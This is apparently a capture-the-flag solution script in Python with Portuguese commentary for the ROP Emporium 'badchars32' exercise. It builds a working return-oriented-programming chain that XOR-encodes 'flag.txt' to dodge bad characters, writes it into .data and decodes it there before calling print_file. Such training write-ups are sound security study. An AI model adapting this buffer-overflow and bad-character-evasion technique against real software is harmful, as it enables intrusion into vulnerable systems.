#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('badchars32')
p = process(elf.path)

### EXPLAINED ###
'''
Aqui já começa os write ups que escrevo bastante kkk
Vou tentar ser breve e não enrolar muito
Objetivo: call print_file(flag.txt)

# badchars = 'x', 'g', 'a', '.'
Dificuldades: badchars, perceba que todos os badchars a string "flag.txt" contém

Solução: fazer um xor na string flag.txt e quando essa string encodada com xor estiver em .data faremos o unxor

Vamos trabalhar com as duas partes da string, expliquei isso no Write Up da challenge_callme
Breve explicação: a arquitetura de 32 bits suporta apenas 4 bytes de endereçamento, e flag.txt (string completa) possui 8 bytes
Não podemos trafegar esses 8 bytes tranquilamente, isso iria crashar o programa, devido ao desalinhamento de pilha]
Por isso cortamos a string em duas partes
'''
flag_first_part = b'flag'
flag_second_part = b'.txt'

# Fazendo um xor na string
def xor(str):
	xored_result = ''
	for c in str:
		xored_result += chr(c ^ 2) # faço xor com a chave int(2) pois se fizer com 1 o resultado retorna com badchars

	return xored_result

# o encode() simplesmente transforma a string em bytes, preciso fazer isso para conseguir packear e mandar corretamente para stack
flag_first_part = xor(flag_first_part).encode()	# primeira parte xored
flag_second_part = xor(flag_second_part).encode() # segunda parte xored

print('[+] Xor Result: {}'.format(xor('flag.txt'.encode())))

# resultados
'''
flag_first_part = b'dnce'	# flag
flag_second_part = b',vzv'	# .txt
'''

print_file = p32(0x080483d0)
pop_esi_edi_ebp = p32(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
mov_edi_esi = p32(0x804854f) # mov dword ptr [edi], esi ; ret
data_section = 0x0804a018

# obs: escolhemos a .data pois ela tem um espaço de 8 bytes, a .bss tem espaço apenas para 4 bytes

xpl = b''
xpl += b'A' * 44 # padding

# First Part
'''
A explicação aqui serve para a Second Part também
Basicamente estamos colocando os pedaços da nossa string na .data
'''
xpl += pop_esi_edi_ebp
xpl += flag_first_part # esi = b'dnce'
xpl += p32(data_section) # edi = .data
xpl += p32(0) #ebp = 0
xpl += mov_edi_esi # mov [.data], b'dnce'

# Second Part
xpl += pop_esi_edi_ebp
xpl += flag_second_part # esi = b',vzv'
xpl += p32(data_section + 0x4) # edu = .data
xpl += p32(0) # ebp = 0
xpl += mov_edi_esi # mov [.data], b',vzv'

'''
agora nosso .data contém flag.txt(dnce,vzv) xored basta a gente fazer o unxor
valor atual de .data = dnce,vzv
valor apoś o unxored = flag.txt
'''

# Gadgets usados para fazer o unxor
'''
Perceba que o único gadget bom que faz xor contém ebp e bl de operando
Então precisamos manipular ebp e ebx (bl = 1byte LSB de ebx)

Em ebp vai a nossa data_section
Em ebx vai nossa key que usamos para encodar a string
Por que nessa ordem? Simples, olhe o gadget de xor [ebp], bl

vai mover o resultado para ebp, e quero justamente que nossa seção .data esteja em ebp para que o resultado vá para ela
e em bl só aceita um byte, justamente o 2 (perceba que o 2 não tem 2 bytes...)
'''

pop_ebp = p32(0x080485bb) # pop ebp ; ret
pop_ebx = p32(0x0804839d) # pop ebx ; ret
xor_ebp_bl = p32(0x08048547) # xor byte ptr [ebp], bl ; ret

for i in range(8):
	xpl += pop_ebp
	xpl += p32(data_section + i) # será incrementado a cada rotação para percorrer todos os caracteres encodados com xor

	xpl += pop_ebx
	xpl += p32(2) # nossa key

	xpl += xor_ebp_bl # unxored char ^ 2

# prontinho, agora em .data temos nossa string em texto plano

xpl += print_file # function
xpl += b'A' * 4	# fake return addr
xpl += p32(data_section) # parameter: flag.txt

'''
o lance do fake return addr é simples: toda vez que uma função é chamada
ela precisa receber um endereço para retornar depois
colocamos qualquer coisa nesse endereço já que não ligamos se o programa quebrar porque já temos a flag
'''

p.sendline(xpl)
p.interactive()

with open('payload', 'wb') as file:
	file.write(xpl)
